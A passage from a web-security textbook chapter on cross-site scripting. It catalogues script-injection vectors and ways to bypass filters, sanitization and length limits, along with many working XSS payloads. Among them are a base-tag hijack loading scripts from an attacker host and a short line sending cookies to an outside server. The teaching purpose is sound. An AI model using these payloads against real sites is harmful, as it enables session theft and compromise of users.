alternative\ncc1122..iinndddd 445566 88//1199//22001111 1122::1122::2299 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 457\nChapter 12 n Attacking Users: Cross-Site Scripting 457\nmeans of introducing script, or you can use slightly malformed syntax that\nbrowsers tolerate. This section examines the numerous different methods of\nexecuting scripts. Then it describes a wide range of techniques that can be used\nto bypass common fi lters.\nWays of Introducing Script Code\nYou can introduce script code into an HTML page in four broad ways. We will\nexamine these in turn, and give some unusual examples of each that may suc-\nceed in bypassing signature-based input fi lters.\nNOTE Browser support for different HTML and scripting syntax varies\nwidely. The behavior of individual browsers often changes with each new\nversion. Any “defi nitive” guide to individual browsers’ behavior is therefore\nliable to quickly become out of date. However, from a security perspective,\napplications need to behave in a robust way for all current and recent versions\nof popular browsers. If an XSS attack can be delivered using only one specifi c\nbrowser that is used by only a small percentage of users, this still constitutes\na vulnerability that should be fi xed. All the examples given in this chapter\nwork on at least one major browser at the time of writing.\nFor reference purposes, this chapter was written in March 2011, and the\nattacks described all work on at least one of the following:\nn Internet Explorer version 8.0.7600.16385\nn Firefox version 3.6.15\nScript Tags\nBeyond directly using a <script> tag, there are various ways in which you can\nuse somewhat convoluted syntax to wrap the use of the tag, defeating some fi lters:\n<object data=”data:text/html,<script>alert(1)</script>”>\n<object data=”data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==”>\n<a href=”data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==”>\nClick here</a>\nThe Base64-encoded string in the preceding examples is:\n<script>alert(1)</script>\nEvent Handlers\nNumerous event handlers can be used with various tags to cause a script to\nexecute. The following are some little-known examples that execute script\nwithout requiring any user interaction:\n<xml onreadystatechange=alert(1)>\n<style onreadystatechange=alert(1)>\n<iframe onreadystatechange=alert(1)>\ncc1122..iinndddd 445577 88//1199//22001111 1122::1122::2299 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 458\n458 Chapter 12 n Attacking Users: Cross-Site Scripting\n<object onerror=alert(1)>\n<object type=image src=valid.gif onreadystatechange=alert(1)></object>\n<img type=image src=valid.gif onreadystatechange=alert(1)>\n<input type=image src=valid.gif onreadystatechange=alert(1)>\n<isindex type=image src=valid.gif onreadystatechange=alert(1)>\n<script onreadystatechange=alert(1)>\n<bgsound onpropertychange=alert(1)>\n<body onbeforeactivate=alert(1)>\n<body onactivate=alert(1)>\n<body onfocusin=alert(1)>\nHTML5 provides a wealth of new vectors using event handlers. These include\nthe use of the autofocus attribute to automatically trigger events that previously\nrequired user interaction:\n<input autofocus onfocus=alert(1)>\n<input onblur=alert(1) autofocus><input autofocus>\n<body onscroll=alert(1)><br><br>...<br><input autofocus>\nIt allows event handlers in closing tags:\n</a onmousemove=alert(1)>\nFinally, HTML5 introduces new tags with event handlers:\n<video src=1 onerror=alert(1)>\n<audio src=1 onerror=alert(1)>\nScript Pseudo-Protocols\nScript pseudo-protocols can be used in various locations to execute inline script\nwithin an attribute that expects a URL. Here are some examples:\n<object data=javascript:alert(1)>\n<iframe src=javascript:alert(1)>\n<embed src=javascript:alert(1)>\nAlthough the javascript pseudo-protocol is most commonly given as an\nexample of this technique, you can also use the vbs protocol on Internet Explorer\nbrowsers, as described later in this chapter.\nAs with event handlers, HTML5 provides some new ways of using script\npseudo-protocols in XSS attacks:\n<form id=test /><button form=test formaction=javascript:alert(1)>\n<event-source src=javascript:alert(1)>\nThe new event-source tag is of particular interest when targeting input fi lters.\nUnlike any pre-HTML5 tags, its name includes a hyphen, so using this tag may\nbypass legacy regex-based fi lters that assume tag names can contain only letters.\ncc1122..iinndddd 445588 88//1199//22001111 1122::1122::2299 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 459\nChapter 12 n Attacking Users: Cross-Site Scripting 459\nDynamically Evaluated Styles\nSome browsers support the use of JavaScript within dynamically evaluated\nCSS styles. The following example works on IE7 and earlier, and also on later\nversions when running in compatibility mode:\n<x style=x:expression(alert(1))>\nLater versions of IE removed support for the preceding syntax, on the basis\nthat its only usage in practice was in XSS attacks. However, on later versions of\nIE, the following can be used to the same effect:\n<x style=behavior:url(#default#time2) onbegin=alert(1)>\nThe Firefox browser used to allow CSS-based attacks via the moz-binding\nproperty, but restrictions made to this feature mean that it is now less useful\nin most XSS scenarios.\nBypassing Filters: HTML\nThe preceding sections described numerous ways in which script code can be\nexecuted from within an HTML page. In many cases, you may fi nd that signature-\nbased fi lters can be defeated simply by switching to a different, lesser-known\nmethod of executing script. If this fails, you need to look at ways of obfuscating\nyour attack. Typically you can do this by introducing unexpected variations\nin your syntax that the fi lter accepts and that the browser tolerates when the\ninput is returned. This section examines the ways in which HTML syntax can\nbe obfuscated to defeat common fi lters. The following section applies the same\nprinciples to JavaScript and VBScript syntax.\nSignature-based fi lters designed to block XSS attacks normally employ regular\nexpressions or other techniques to identify key HTML components, such as tag\nbrackets, tag names, attribute names, and attribute values. For example, a fi lter\nmay seek to block input containing HTML that uses specifi c tag or attribute\nnames known to allow the introduction of script, or it may try to block attri-\nbute values starting with a script pseudo-protocol. Many of these fi lters can be\nbypassed by placing unusual characters at key points within the HTML in a\nway that one or more browsers tolerate.\nTo see this technique in action, consider the following simple exploit:\n<img onerror=alert(1) src=a>\nYou can modify this syntax in numerous ways and still have your code execute\non at least one browser. We will examine each of these in turn. In practice, you\nmay need to combine several of these techniques in a single exploit to bypass\nmore sophisticated input fi lters.\ncc1122..iinndddd 445599 88//1199//22001111 1122::1122::2299 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 460\n460 Chapter 12 n Attacking Users: Cross-Site Scripting\nThe Tag Name\nStarting with the opening tag name, the most simple and naïve fi lters can be\nbypassed simply by varying the case of the characters used:\n<iMg onerror=alert(1) src=a>\nGoing further, you can insert NULL bytes at any position:\n<[%00]img onerror=alert(1) src=a>\n<i[%00]mg onerror=alert(1) src=a>\n(In these examples, [%XX] indicates the literal character with the hexadecimal\nASCII code of XX. When submitting your attack to the application, generally you\nwould use the URL-encoded form of the character. When reviewing the applica-\ntion’s response, you need to look for the literal decoded character being refl ected.)\nTIP The NULL byte trick works on Internet Explorer anywhere within the\nHTML page. Liberal use of NULL bytes in XSS attacks often provides a quick\nway to bypass signature-based fi lters that are unaware of IE’s behavior.\nUsing NULL bytes has historically proven effective against web applica-\ntion fi rewalls (WAFs) confi gured to block requests containing known attack\nstrings. Because WAFs typically are written in native code for performance\nreasons, a NULL byte terminates the string in which it appears. This prevents\nthe WAF from seeing the malicious payload that comes after the NULL (see\nChapter 16 for more details).\nGoing further within tag names, if you modify the example slightly, you can\nuse arbitrary tag names to introduce event handlers, thereby bypassing fi lters\nthat merely block specifi c named tags:\n<x onclick=alert(1) src=a>Click here</x>\nIn some situations, you may be able to introduce new tags with various names\nbut not fi nd any means of using these to directly execute code. In these situa-\ntions, you may be able to deliver an attack using a technique known as “base tag\nhijacking.” The <base> tag is used to specify a URL that the browser should use\nto resolve any relative URLs that appear subsequently within the page. If you can\nintroduce a new <base> tag, and the page performs any <script> includes after\nyour refl ection point using relative URLs, you can specify a base URL to a server\nthat you control. When the browser loads the scripts specifi ed in the remainder of\nthe HTML page, they are loaded from the server you specifi ed, yet they are still\nexecuted in the context of the page that has invoked them. For example:\n<base href=”http://mdattacker.net/badscripts/”>\n...\n<script src=”goodscript.js”></script>\ncc1122..iinndddd 446600 88//1199//22001111 1122::1122::2299 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 461\nChapter 12 n Attacking Users: Cross-Site Scripting 461\nAccording to specifi cations, <base> tags should appear within the <head>\nsection of the HTML page. However, some browsers, including Firefox, accept\n<base> tags appearing anywhere in the page, considerably widening the scope\nof this attack.\nSpace Following the Tag Name\nSeveral characters can replace the space between the tag name and the fi rst\nattribute name:\n<img/onerror=alert(1) src=a>\n<img[%09]onerror=alert(1) src=a>\n<img[%0d]onerror=alert(1) src=a>\n<img[%0a]onerror=alert(1) src=a>\n<img/”onerror=alert(1) src=a>\n<img/’onerror=alert(1) src=a>\n<img/anyjunk/onerror=alert(1) src=a>\nNote that even where an attack does not require any tag attributes, you should\nalways try adding some superfl uous content after the tag name, because this\nbypasses some simple fi lters:\n<script/anyjunk>alert(1)</script>\nAttribute Names\nWithin the attribute name, you can use the same NULL byte trick described\nearlier. This bypasses many simple fi lters that try to block event handlers by\nblocking attribute names starting with on:\n<img o[%00]nerror=alert(1) src=a>\nAttribute Delimiters\nIn the original example, attribute values were not delimited, requiring some\nwhitespace after the attribute value to indicate that it has ended before another\nattribute can be introduced. Attributes can optionally be delimited with double\nor single quotes or, on IE, with backticks:\n<img onerror=”alert(1)”src=a>\n<img onerror=’alert(1)’src=a>\n<img onerror=`alert(1)`src=a>\nSwitching around the attributes in the preceding example provides a further\nway to bypass some fi lters that check for attribute names starting with on. If\nthe fi lter is unaware that backticks work as attribute delimiters, it treats the\nfollowing example as containing a single attribute, whose name is not that of\nan event handler:\n<img src=`a`onerror=alert(1)>\ncc1122..iinndddd 446611 88//1199//22001111 1122::1122::2299 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 462\n462 Chapter 12 n Attacking Users: Cross-Site Scripting\nBy combining quote-delimited attributes with unexpected characters\nfollowing the tag name, attacks can be devised that do not use any whitespace,\nthereby bypassing some simple fi lters:\n<img/onerror=”alert(1)”src=a>\nTRY IT!\nhttp://mdsec.net/search/69/\nhttp://mdsec.net/search/72/\nhttp://mdsec.net/search/75/\nAttribute Values\nWithin attribute values themselves, you can use the NULL byte trick, and you\nalso can HTML-encode characters within the value:\n<img onerror=a[%00]lert(1) src=a>\n<img onerror=a&#x6c;ert(1) src=a>\nBecause the browser HTML-decodes the attribute value before processing\nit further, you can use HTML encoding to obfuscate your use of script code,\nthereby evading many fi lters. For example, the following attack bypasses many\nfi lters seeking to block use of the JavaScript pseudo-protocol handler:\n<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >\nWhen using HTML encoding, it is worth noting that browse rs tolerate vari-\nous deviations from the specifi cations, in ways that even fi lters that are aware\nof HTML encoding issues may overlook. You can use both decimal and hexa-\ndecimal format, add superfl uous leading zeros, and omit the trailing semicolon.\nThe following examples all work on at least one browser:\n<img onerror=a&#x06c;ert(1) src=a>\n<img onerror=a&#x006c;ert(1) src=a>\n<img onerror=a&#x0006c;ert(1) src=a>\n<img onerror=a&#108;ert(1) src=a>\n<img onerror=a&#0108;ert(1) src=a>\n<img onerror=a&#108ert(1) src=a>\n<img onerror=a&#0108ert(1) src=a>\nTag Brackets\nIn some situations, by exploiting quirky application or browser behavior, it is\npossible to use invalid tag brackets and still cause the browser to process the\ntag in the way the attack requires.\ncc1122..iinndddd 446622 88//1199//22001111 1122::1122::2299 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 463\nChapter 12 n Attacking Users: Cross-Site Scripting 463\nSome applications perform a superfl uous URL decode of input after their\ninput fi lters have been applied, so the following input appearing in a request:\n%253cimg%20onerror=alert(1)%20src=a%253e\nis URL-decoded by the application server and passed to the application as:\n%3cimg onerror=alert(1) src=a%3e\nwhich does not contain any tag brackets and therefore is not blocked by the\ninput fi lter. However, the application then performs a second URL decode, so\nthe input becomes:\n<img onerror=alert(1) src=a>\nwhich is echoed to the user, causing the attack to execute.\nAs described in Chapter 2, something similar can happen when an application\nframework “translates” unusual Unicode characters into their nearest ASCII\nequivalents based on the similarity of their glyphs or phonetics. For example,\nthe following input uses Unicode double-angle quotation marks (%u00AB and\n%u00BB) instead of tag brackets:\n«img onerror=alert(1) src=a»\nThe application’s input fi lters may allow this input because it does not\ncontain any problematic HTML. However, if the application framework trans-\nlates the quotation marks into tag characters at the point where the input is\ninserted into a response, the attack succeeds. Numerous applications have\nbeen found vulnerable to this kind of attack, which developers may be for-\ngiven for overlooking.\nSome input fi lters identify HTML tags by simply matching opening and clos-\ning angle brackets, extracting the contents, and comparing this to a blacklist\nof tag names. In this situation, you may be able to bypass the fi lter by using\nsuperfl uous brackets, which the browser tolerates:\n<<script>alert(1);//<</script>\nIn some cases, unexpected behavior in browsers’ HTML parsers can be lever-\naged to deliver an attack that bypasses an application’s input fi lters. For example,\nthe following HTML, which uses ECMAScript for XML (E4X) syntax, does not\ncontain a valid opening script tag but nevertheless executes the enclosed script\non current versions of Firefox:\n<script<{alert(1)}/></script>\ncc1122..iinndddd 446633 88//1199//22001111 1122::1122::3300 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 464\n464 Chapter 12 n Attacking Users: Cross-Site Scripting\nTIP In several of the fi lter bypasses described, the attack results in HTML\nthat is malformed but is nevertheless tolerated by the client browser. Because\nnumerous quite legitimate websites contain HTML that does not strictly com-\nply to the standards, browsers accept HTML that is deviant in all kinds of ways.\nThey effectively fi x the errors behind the scenes before the page is rendered.\nOften, when you are trying to fi ne-tune an attack in an unusual situation, it\ncan be helpful to view the virtual HTML that the browser constructs out of the\nserver’s actual response. In Firefox, you can use the WebDeveloper tool, which\ncontains a View Generated Source function that performs precisely this task.\nCharacter Sets\nIn some situations, you can employ a powerful means of bypassing many types\nof fi lters by causing the application to accept a nonstandard encoding of your\nattack payload. The following examples show some representations of the string\n<script>alert(document.cookie)</script> in alternative character sets:\nUTF-7\n+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-\nUS-ASCII\nBC 73 63 72 69 70 74 BE 61 6C 65 72 74 28 64 6F ; ¼script¾alert(do\n63 75 6D 65 6E 74 2E 63 6F 6F 6B 69 65 29 BC 2F ; cument.cookie)¼/\n73 63 72 69 70 74 BE ; script¾\nUTF-16\nFF FE 3C 00 73 00 63 00 72 00 69 00 70 00 74 00 ; ÿþ<.s.c.r.i.p.t.\n3E 00 61 00 6C 00 65 00 72 00 74 00 28 00 64 00 ; >.a.l.e.r.t.(.d.\n6F 00 63 00 75 00 6D 00 65 00 6E 00 74 00 2E 00 ; o.c.u.m.e.n.t...\n63 00 6F 00 6F 00 6B 00 69 00 65 00 29 00 3C 00 ; c.o.o.k.i.e.).<.\n2F 00 73 00 63 00 72 00 69 00 70 00 74 00 3E 00 ; /.s.c.r.i.p.t.>.\nThese encoded strings will bypass many common anti-XSS fi lters. The challenge\nof delivering a successful attack is to make the browser interpret the response\nusing the character set required. If you control either the HTTP Content-Type\nheader or its corresponding HTML metatag, you may be able to use a nonstan-\ndard character set to bypass the application’s fi lters and cause the browser to\ninterpret your payload in the way you require. In some applications, a charset\nparameter is actually submitted in certain requests, enabling you to directly\nset the character set used in the application’s response.\nIf the application by default uses a multibyte character set, such as Shift-JIS,\nthis may enable you to bypass certain input fi lters by submitting characters that\nhave special signifi cance in the character set being used. For example, suppose\ntwo pieces of user input are returned in the application’s response:\n<img src=”image.gif” alt=”[input1]” /> ... [input2]\ncc1122..iinndddd 446644 88//1199//22001111 1122::1122::3300 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 465\nChapter 12 n Attacking Users: Cross-Site Scripting 465\nFor input1, the application blocks input containing quotation marks to prevent\nan attacker from terminating the quoted attribute. For input2, the application\nblocks input containing angle brackets to prevent an attacker from using any\nHTML tags. This appears to be robust, but an attacker may be able to deliver\nan exploit using the following two inputs:\ninput1: [%f0]\ninput2: “onload=alert(1);\nIn the Shift-JIS character set, various raw byte values, including 0xf0, are used\nto signal a 2-byte character that is composed of that byte and the following byte.\nHence, when the browser processes input1, the quotation mark following the\n0xf0 byte is interpreted as part of a 2-byte character and therefore does not delimit\nthe attribute value. The HTML parser continues until it reaches the quotation\nmark supplied in input2, which terminates the attribute, allowing the attacker’s\nsupplied event handler to be interpreted as an additional tag attribute:\n<img src=”image.gif” alt=”? /> ... “onload=alert(1);\nWhen exploits of this kind were identifi ed in the widely used multibyte\ncharacter set UTF-8, browser vendors responded with a fi x that prevented the\nattack from succeeding. However, currently the same attack still works on some\nbrowsers against several other lesser-used multibyte character sets, including\nShift-JIS, EUC-JP, and BIG5.\nBypassing Filters: Script Code\nIn some situations, you will fi nd a way to manipulate refl ected input to introduce\na script context into the application’s response. However, various other obstacles\nmay prevent you from executing the code you need to deliver an actual attack.\nThe kind of fi lters you may encounter here typically seek to block the use of\ncertain JavaScript keywords and other expressions. They may also block useful\ncharacters such as quotes, brackets, and dots.\nAs with the obfuscation of attacks using HTML, you can use numerous\ntechniques to modify your desired script code to bypass common input fi lters.\nUsing JavaScript Escaping\nJavaScript allows various kinds of character escaping, which you can use to\navoid including required expressions in their literal form.\nUnicode escapes can be used to represent characters within JavaScript key-\nwords, allowing you to bypass many kinds of fi lters:\n<script>a\\u006cert(1);</script>\nIf you can make use of the eval command, possibly by using the preceding\ntechnique to escape some of its characters, you can execute other commands\nby passing them to the eval command in string form. This allows you to\ncc1122..iinndddd 446655 88//1199//22001111 1122::1122::3300 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 466\n466 Chapter 12 n Attacking Users: Cross-Site Scripting\nuse various string manipulation techniques to hide the command you are\nexecuting.\nWithin JavaScript strings, you can use Unicode escapes, hexadecimal escapes,\nand octal escapes:\n<script>eval(‘a\\u006cert(1)’);</script>\n<script>eval(‘a\\x6cert(1)’);</script>\n<script>eval(‘a\\154ert(1)’);</script>\nFurthermore, superfl uous escape characters within strings are ignored:\n<script>eval(‘a\\l\\ert\\(1\\)’);</script>\nDynamically Constructing Strings\nYou can use other techniques to dynamically construct strings to use in your attacks:\n<script>eval(‘al’+’ert(1)’);</script>\n<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41));</script>\n<script>eval(atob(‘amF2YXNjcmlwdDphbGVydCgxKQ’));</script>\nThe fi nal example, which works on Firefox, allows you to decode a Base64-\nencoded command before passing it to eval.\nAlternatives to eval\nIf direct calls to the eval command are not possible, you have other ways to\nexecute commands in string form:\n<script>’alert(1)’.replace(/.+/,eval)</script>\n<script>function::[‘alert’](1)</script>\nAlternatives to Dots\nIf the dot character is being blocked, you can use other methods to perform\ndereferences:\n<script>alert(document[‘cookie’])</script>\n<script>with(document)alert(cookie)</script>\nCombining Multiple Techniques\nThe techniques described so far can often be used in combination to apply sev-\neral layers of obfuscation to your attack. Furthermore, in cases where JavaScript\nis being used within an HTML tag attribute (via an event handler, scripting\npseudo-protocol, or dynamically evaluated style), you can combine these tech-\nniques with HTML encoding. The browser HTML-decodes the tag attribute\nvalue before the JavaScript it contains is interpreted. In the following example,\nthe “e” character in “alert” has been escaped using Unicode escaping, and the\nbackslash used in the Unicode escape has been HTML-encoded:\n<img onerror=eval(‘al&#x5c;u0065rt(1)’) src=a>\ncc1122..iinndddd 446666 88//1199//22001111 1122::1122::3300 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 467\nChapter 12 n Attacking Users: Cross-Site Scripting 467\nOf course, any of the other characters within the onerror attribute value could\nalso be HTML-encoded to further hide the attack:\n<img onerror=&#x65;&#x76;&#x61;&#x6c;&#x28;&#x27;al&#x5c;u0065rt&#x28;1&\n#x29;&#x27;&#x29; src=a>\nThis technique enables you to bypass many fi lters on JavaScript code, because\nyou can avoid using any JavaScript keywords or other syntax such as quotes,\nperiods, and brackets.\nUsing VBScript\nAlthough common examples of XSS exploits typically focus on JavaScript, on\nInternet Explorer you also can use the VBScript language. It has different syntax\nand other properties that you may be able to leverage to bypass many input\nfi lters that were designed with only JavaScript in mind.\nYou can introduce VBScript code in various ways:\n<script language=vbs>MsgBox 1</script>\n<img onerror=”vbs:MsgBox 1” src=a>\n<img onerror=MsgBox+1 language=vbs src=a>\nIn all cases, you can use vbscript instead of vbs to specify the language. In\nthe last example, note the use of MsgBox+1 to avoid the use of whitespace, thereby\navoiding the need for quotes around the attribute value. This works because\n+1 effectively adds the number 1 to nothing, so the expression evaluates to 1,\nwhich is passed to the MsgBox function.\nIt is noteworthy that in VBScript, some functions can be called without brack-\nets, as shown in the preceding examples. This may allow you to bypass some\nfi lters that assume that script code must employ brackets to access any functions.\nFurthermore, unlike JavaScript, the VBScript language is not case-sensitive,\nso you can use upper and lowercase characters in all keywords and function\nnames. This behavior is most useful when the application function you are\nattacking modifi es the case of your input, such as by converting it to uppercase.\nAlthough this may have been done for reasons of functionality rather than secu-\nrity, it may frustrate XSS exploits using JavaScript code, which fails to execute\nwhen converted to uppercase. In contrast, exploits using VBScript still work:\n<SCRIPT LANGUAGE=VBS>MSGBOX 1</SCRIPT>\n<IMG ONERROR=”VBS:MSGBOX 1” SRC=A>\nCombining VBScript and JavaScript\nTo add further layers of complexity to your attack, and circumvent some fi lters,\nyou can call into VBScript from JavaScript, and vice versa:\n<script>execScript(“MsgBox 1”,”vbscript”);</script>\n<script language=vbs>execScript(“alert(1)”)</script>\ncc1122..iinndddd 446677 88//1199//22001111 1122::1122::3300 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 468\n468 Chapter 12 n Attacking Users: Cross-Site Scripting\nYou can even nest these calls and ping-pong between the languages as required:\n<script>execScript(‘execScript\n“alert(1)”,”javascript”’,”vbscript”);</script>\nAs mentioned, VBScript is case-insensitive, allowing you to execute code in\ncontexts where your input is converted to uppercase. If you really want to call\nJavaScript functions in these situations, you can use string manipulation func-\ntions within VBScript to construct a command with the required case and then\nexecute this using JavaScript:\n<SCRIPT LANGUAGE=VBS>EXECSCRIPT(LCASE(“ALERT(1)”)) </SCRIPT>\n<IMG ONERROR=”VBS:EXECSCRIPT LCASE(‘ALERT(1)’)” SRC=A>\nUsing Encoded Scripts\nOn Internet Explorer, you can use Microsoft’s custom script-encoding algorithm\nto hide the contents of scripts and potentially bypass some input fi lters:\n<img onerror=”VBScript.Encode:#@~^CAAAAA==\\ko$K6,FoQIAAA==^#~@” src=a>\n<img language=”JScript.Encode” onerror=”#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@”\nsrc=a>\nThis encoding was originally designed to prevent users from inspecting\nclient-side scripts easily by viewing the source code for the HTML page. It has\nsince been reverse-engineered, and numerous tools and websites will let you\ndecode encoded scripts. You can encode your own scripts for use in attacks via\nMicrosoft’s command-line utility srcenc in older versions of Windows.\nBeating Sanitization\nOf all the obstacles that you may encounter when attempting to exploit poten-\ntial XSS conditions, sanitizing fi lters are probably the most common. Here, the\napplication performs some kind of sanitization or encoding on your attack string\nthat renders it harmless, preventing it from causing the execution of JavaScript.\nThe most prevalent manifestation of data sanitization occurs when the appli-\ncation HTML-encodes certain key characters that are necessary to deliver an\nattack (so < becomes &lt; and > becomes &gt;). In other cases, the application\nmay remove certain characters or expressions in an attempt to cleanse your\ninput of malicious content.\nWhen you encounter this defense, your fi rst step is to determine precisely\nwhich characters and expressions are being sanitized, and whether it is still\npossible to carry out an attack without directly employing these characters\nand expressions. For example, if your data is being inserted directly into an\nexisting script, you may not need to employ any HTML tag characters. Or, if\nthe application is removing <script> tags from your input, you may be able\ncc1122..iinndddd 446688 88//1199//22001111 1122::1122::3300 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 469\nChapter 12 n Attacking Users: Cross-Site Scripting 469\nto use a different tag with a suitable event handler. Here, you should consider\nall the techniques already discussed for dealing with signature-based fi lters,\nincluding using layers of encoding, NULL bytes, nonstandard syntax, and\nobfuscated script code. By modifying your input in the various ways described,\nyou may be able to devise an attack that does not contain any of the characters\nor expressions that the fi lter is sanitizing and therefore successfully bypass it.\nIf it appears impossible to perform an attack without using input that is being\nsanitized, you need to test the effectiveness of the sanitizing fi lter to establish\nwhether any bypasses exist.\nAs described in Chapter 2, several mistakes often appear in sanitizing fi lters.\nSome string manipulation APIs contain methods to replace only the fi rst instance\nof a matched expression, and these are sometimes easily confused with methods\nthat replace all instances. So if <script> is being stripped from your input, you\nshould try the following to check whether all instances are being removed:\n<script><script>alert(1)</script>\nIn this situation, you should also check whether the sanitization is being\nperformed recursively:\n<scr<script>ipt>alert(1)</script>\nFurthermore, if the fi lter performs several sanitizing steps on your input, you\nshould check whether the order or interplay between these can be exploited.\nFor example, if the fi lter strips <script> recursively and then strips <object>\nrecursively, the following attack may succeed:\n<scr<object>ipt>alert(1)</script>\nWhen you are injecting into a quoted string in an existing script, it is com-\nmon to fi nd that the application sanitizes your input by placing the backslash\ncharacter before any quotation mark characters you submit. This escapes your\nquotation marks, preventing you from terminating the string and injecting\narbitrary script. In this situation, you should always verify whether the back-\nslash character itself is being escaped. If not, a simple fi lter bypass is possible.\nFor example, if you control the value foo in:\nvar a = ‘foo’;\nyou can inject:\nfoo\\’; alert(1);//\nThis results in the following response, in which your injected script exe-\ncutes. Note the use of the JavaScript comment character // to comment out the\ncc1122..iinndddd 446699 88//1199//22001111 1122::1122::3311 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 470\n470 Chapter 12 n Attacking Users: Cross-Site Scripting\nremainder of the line, thus preventing a syntax error caused by the application’s\nown string delimiter:\nvar a = ‘foo\\\\’; alert(1);//’;\nHere, if you fi nd that the backslash character is also being properly escaped,\nbut angle brackets are returned unsanitized, you can use the following attack:\n</script><script>alert(1)</script>\nThis effectively abandons the application’s original script and injects a new\none immediately after it. The attack works because browsers’ parsing of HTML\ntags takes precedence over their parsing of embedded JavaScript:\n<script>var a = ‘</script><script>alert(1)</script>\nAlthough the original script now contains a syntax error, this does not matter,\nbecause the browser moves on and executes your injected script regardless of\nthe error in the original script.\nTRY IT!\nhttp://mdsec.net/search/48/\nhttp://mdsec.net/search/52/\nTIP If you can inject into a script, but you cannot use quotation marks because\nthese are being escaped, you can use the String.fromCharCode technique to\nconstruct strings without the need for delimiters, as described previously.\nIn cases where the script you are injecting into resides within an event handler,\nrather than a full script block, you may be able to HTML-encode your quotation\nmarks to bypass the application’s sanitization and break out of the string you\ncontrol. For example, if you control the value foo in:\n<a href=”#” onclick=”var a = ‘foo’; ...\nand the application is properly escaping both quotation marks and backslashes\nin your input, the following attack may succeed:\nfoo&apos;; alert(1);//\nThis results in the following response, and because some browsers perform\nan HTML decode before the event handler is executed as JavaScript, the attack\nsucceeds:\n<a href=”#” onclick=”var a = ‘foo&apos;; alert(1);//’; ...\ncc1122..iinndddd 447700 88//1199//22001111 1122::1122::3311 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 471\nChapter 12 n Attacking Users: Cross-Site Scripting 471\nThe fact that event handlers are HTML-decoded before being executed as\nJavaScript represents an important caveat to the standard recommendation\nof HTML-encoding user input to prevent XSS attacks. In this syntactic context,\nHTML encoding is not necessarily an obstacle to an attack. The attacker himself\nmay even use it to circumvent other defenses.\nBeating Length Limits\nWhen the application truncates your input to a fi xed maximum length, you\nhave three possible approaches to creating a working exploit.\nThe fi rst, rather obvious method is to attempt to shorten your attack payload\nby using JavaScript APIs with the shortest possible length and removing char-\nacters that are usually included but are strictly unnecessary. For example, if you\nare injecting into an existing script, the following 28-byte command transmits\nthe user’s cookies to the server with hostname a:\nopen(“//a/”+document.cookie)\nAlternatively, if you are injecting straight into HTML, the following 30-byte\ntag loads and executes a script from the server with hostname a:\n<script src=http://a></script>\nOn the Internet, these examples would obviously need to be expanded to\ncontain a valid domain name or IP address. However, on an internal corporate\nnetwork, it may actually be possible to use a machine with the WINS name a\nto host the recipient server.\nTIP You can use Dean Edwards’ JavaScript packer to shrink a given script as\nmuch as possible by eliminating unnecessary whitespace. This utility also con-\nverts scripts to a single line for easy insertion into a request parameter:\nhttp://dean.edwards.name/packer/\nThe second, potentially more powerful technique for beating length limits\nis to span an attack payload across multiple different locations where user-\ncontrollable input is inserted into the same returned page. For example, consider\nthe following URL:\nhttps://wahh-app.com/account.php?page_id=244&seed=129402931&mode=normal\nIt returns a page containing the following:\n<input type=”hidden” name=”page_id” value=”244”>\n<input type=”hidden” name=”seed” value=”129402931”>\n<input type=”hidden” name=”mode” value=”normal”>\ncc1122..iinndddd 447711 88//1199//22001111 1122::1122::3311 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 472\n472 Chapter 12 n Attacking Users: Cross-Site Scripting\nSuppose that each fi eld has length restrictions, such that no feasible attack\nstring can be inserted into any of them. Nevertheless, you can still deliver a\nworking exploit by using the following URL to span a script across the three\nlocations you control:\nhttps://myapp.com/account.php?page_id=”><script>/*&seed=*/alert(document\n.cookie);/*&mode=*/</script>\nWhen the parameter values from this URL are embedded into the page, the\nresult is the following:\n<input type=”hidden” name=”page_id” value=””><script>/*”>\n<input type=”hidden” name=”seed” value=”*/alert(document.cookie);/*”>\n<input type=”hidden” name=”mode” value=”*/</script>”>\nThe resulting HTML is valid and is equivalent to only the portions in bold.\nThe chunks of source code in between have effectively become JavaScript com-\nments (surrounded by the /* and */ markers), so the browser ignores them.\nHence, your script is executed just as if it had been inserted whole at one loca-\ntion within the page.\nTIP The technique of spanning an attack payload across multiple fi elds can\nsometimes be used to beat other types of defensive fi lters. It is fairly common\nto fi nd different data validation and sanitization being implemented on differ-\nent fi elds within a single page of an application. In the previous example, sup-\npose that the page_id and mode parameters are subject to a maximum length\nof 12 characters. Because these fi elds are so short, the application’s developers\ndid not bother to implement any XSS fi lters. The seed parameter, on the other\nhand, is unrestricted in length, so rigorous fi lters were implemented to prevent\nthe injection of the characters “< or >. In this scenario, despite the developers’\nefforts, it is still possible to insert an arbitrarily long script into the seed param-\neter without employing any of the blocked characters, because the JavaScript\ncontext can be created by data injected into the surrounding fi elds.\nA third technique for beating length limits, which can be highly effective\nin some situations, is to “convert” a refl ected XSS fl aw into a DOM-based\nvulnerability. For example, in the original refl ected XSS vulnerability, if the\napplication places a length restriction on the message parameter that is cop-\nied into the returned page, you can inject the following 45-byte script, which\nevaluates the fragment string in the current URL:\n<script>eval(location.hash.slice(1))</script>\nBy injecting this script into the parameter that is vulnerable to refl ected XSS,\nyou can effectively induce a DOM-based XSS vulnerability in the resulting page\ncc1122..iinndddd 447722 88//1199//22001111 1122::1122::3311 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 473\nChapter 12 n Attacking Users: Cross-Site Scripting 473\nand thus execute a second script located within the fragment string, which 